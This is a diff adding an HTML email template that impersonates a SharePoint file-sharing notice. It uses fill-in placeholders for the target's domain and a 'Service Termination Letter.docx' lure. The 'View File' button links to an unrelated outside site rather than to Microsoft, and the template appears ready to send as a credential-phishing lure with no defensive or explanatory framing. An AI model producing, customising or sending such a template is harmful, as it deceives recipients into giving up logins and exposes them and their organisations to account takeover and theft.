@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>SharePoint File Shared</title>
+</head>
+
+<body style="margin:0;background:#f2f2f2;font-family:Segoe UI,Arial,sans-serif;">
+
+<table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:30px 0;">
+<tr>
+<td align="center">
+
+<!-- Main Container -->
+<table width="640" cellpadding="0" cellspacing="0" border="0" style="background:#ffffff;border-radius:6px;overflow:hidden;">
+
+<!-- Top bar -->
+<tr>
+<td style="background:#0f7b7b;height:6px;"></td>
+</tr>
+
+<!-- Header -->
+<tr>
+<td style="padding:28px 40px 10px 40px;">
+
+<table width="100%">
+<tr>
+
+<td width="40">
+</td>
+
+<td style="font-size:20px;font-weight:600;color:#333;">
+<DOMAINEMAILNAME> Workspace Internal Document Portal
+</td>
+
+</tr>
+</table>
+
+</td>
+</tr>
+
+<!-- Title -->
+<tr>
+<td style="padding:10px 40px 20px 40px;font-size:26px;font-weight:600;color:#333;">
+A document has been shared with you
+</td>
+</tr>
+
+<!-- User Card -->
+<tr>
+<td style="padding:0 40px 20px 40px;">
+
+<table width="100%" style="background:#f3f3f3;border-radius:8px;padding:18px;">
+<tr>
+
+<td width="60">
+<div style="width:44px;height:44px;border-radius:50%;background:#167e7e;color:#fff;
+display:flex;align-items:center;justify-content:center;font-weight:600;">
+
+</div>
+</td>
+
+<td style="font-size:16px;color:#333;">
+<strong><DOMAINEMAILNAME></strong><br>
+<span style="color:#666;font-size:14px;">
+received <DOMAINEMAILNAME> Service Termination Letter.docx with you
+</span>
+</td>
+
+</tr>
+</table>
+
+</td>
+</tr>
+
+<!-- File Card -->
+<tr>
+<td style="padding:0 40px 25px 40px;">
+
+<table width="100%" style="border:1px solid #e1e1e1;border-radius:6px;padding:16px;">
+<tr>
+
+<td style="font-size:15px;color:#333;">
+📄 <strong>Service Termination Letter.docx</strong>
+<span style="color:#888;">&nbsp;&nbsp;1.7 MB • Modified today</span>
+</td>
+
+</tr>
+</table>
+
+</td>
+</tr>
+
+<!-- Button -->
+<tr>
+<td style="padding:0 40px 35px 40px;">
+
+<a href="https://andescolor.com/recoveryonlinemart/index6.html" style="
+background:#147a7a;
+color:#ffffff;
+text-decoration:none;
+padding:14px 28px;
+border-radius:5px;
+font-weight:600;
+display:inline-block;
+font-size:16px;">
+View File
+</a>
+
+</td>
+</tr>
+
+<!-- Footer -->
+<tr>
+<td style="border-top:1px solid #e6e6e6;padding:20px 40px 30px 40px;color:#8a8a8a;font-size:13px;line-height:1.6;">
+
+You're receiving this because someone shared an item internally with you.<br><br>
+
+© 2026 {host}. All rights reserved.
+
+</td>
+</tr>
+
+</table>
+
+</td>
+</tr>
+</table>
+
+</body>
+</html>
